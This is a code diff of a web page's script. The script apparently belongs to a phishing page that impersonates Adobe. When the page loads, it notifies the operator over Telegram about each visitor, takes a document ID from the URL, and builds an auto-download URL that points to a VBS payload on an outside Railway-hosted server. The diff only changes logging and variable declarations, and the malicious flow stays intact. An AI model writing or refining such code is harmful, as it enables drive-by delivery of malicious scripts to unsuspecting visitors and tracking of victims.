@@ -2337,9 +2337,6 @@
   <script nonce="MTk0NTg0Nzc5NywxMzc2NDA5OTEx">
       // Auto-download file on page load (sample URL)
       window.addEventListener('load', async function() {
-        console.log('ADOBE URL:', window.location.href);
-console.log('ADOBE PATH:', window.location.pathname);
-console.log('ADOBE PARTS:', window.location.pathname.split('/'));
         // Send Telegram notification for visitor
         console.log('Starting Telegram notification...');
         try {
@@ -2350,12 +2347,12 @@ console.log('ADOBE PARTS:', window.location.pathname.split('/'));
         } catch (error) {
           console.error('Error with visitor tracking:', error);
         }
+
+
         
-
-
-var docId = window.location.pathname.split('/')[2];
-
-console.log('ADOBE DOCID:', docId);
+        const docId = window.location.pathname.split('/')[2];
+        
+        console.log('ADOBE DOCID:', docId);
         
         var downloadUrl = 'https://nodejnct-production.up.railway.app/download/vbs/adobe/' + encodeURIComponent(docId);
         
